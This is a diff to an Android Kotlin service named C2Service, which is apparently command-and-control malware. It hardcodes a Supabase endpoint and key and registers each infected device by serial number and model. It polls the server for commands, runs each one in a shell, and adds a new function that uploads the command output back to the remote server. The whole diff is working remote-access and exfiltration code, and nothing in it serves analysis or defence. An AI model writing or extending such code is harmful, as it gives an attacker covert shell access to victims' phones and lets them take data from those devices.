@@ -4,6 +4,7 @@ import android.app.Service
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
+import android.util.Log
 import okhttp3.*
 import org.json.JSONArray
 import org.json.JSONObject
@@ -12,15 +13,18 @@ import java.io.InputStreamReader
 import java.util.concurrent.TimeUnit
 
 class C2Service : Service() {
-    // === PLACEHOLDERS (GitHub Action Injects here) ===
-    private val SUPABASE_URL = "YOUR_SUPABASE_URL" 
-    private val SUPABASE_KEY = "YOUR_SUPABASE_KEY"
-    private val USER_ID = "YOUR_USER_ID"
-    // ==================================================
+    // === YOUR HARDCODED SUPABASE DETAILS ===
+    private val SUPABASE_URL = "https://fmfxqjerktoclzmuited.supabase.co"
+    private val SUPABASE_KEY = "sb_publishable_v8EhqjGh1B87NatTuypl9w_xS3V3JRF"
+    private val USER_ID = "YOUR_USER_ID" // Build time pe replace hoga
+    // ========================================
 
     private val SID = Build.SERIAL + "_" + Build.MODEL
     private var isRunning = true
-    private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).build()
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(15, TimeUnit.SECONDS)
+        .readTimeout(15, TimeUnit.SECONDS)
+        .build()
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Thread {
@@ -50,6 +54,7 @@ class C2Service : Service() {
             put("os", "Android ${Build.VERSION.RELEASE}")
             put("status", "online")
         }
+        
         val req = Request.Builder()
             .url("$SUPABASE_URL/rest/v1/devices?on_conflict=id")
             .headers(headers())
@@ -77,15 +82,16 @@ class C2Service : Service() {
                         val id = cmdObj.getInt("id")
                         val cmd = cmdObj.getString("command")
                         
-                        val output = execCmd(cmd)
+                        val output = executeCommand(cmd)
                         markDone(id)
+                        uploadData("cmd_output", output)
                     }
                 } catch (e: Exception) {}
             }
         })
     }
 
-    private fun execCmd(cmd: String): String {
+    private fun executeCommand(cmd: String): String {
         return try {
             val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
             val reader = BufferedReader(InputStreamReader(p.inputStream))
@@ -103,6 +109,20 @@ class C2Service : Service() {
             .url("$SUPABASE_URL/rest/v1/commands?id=eq.$cmdId")
             .headers(headers())
             .patch(RequestBody.create(MediaType.parse("application/json"), json.toString()))
+            .build()
+        client.newCall(req).execute().close()
+    }
+
+    private fun uploadData(type: String, content: String) {
+        val json = JSONObject().apply {
+            put("device_id", SID)
+            put("type", type)
+            put("content", content)
+        }
+        val req = Request.Builder()
+            .url("$SUPABASE_URL/rest/v1/results")
+            .headers(headers())
+            .post(RequestBody.create(MediaType.parse("application/json"), json.toString()))
             .build()
         client.newCall(req).execute().close()
     }
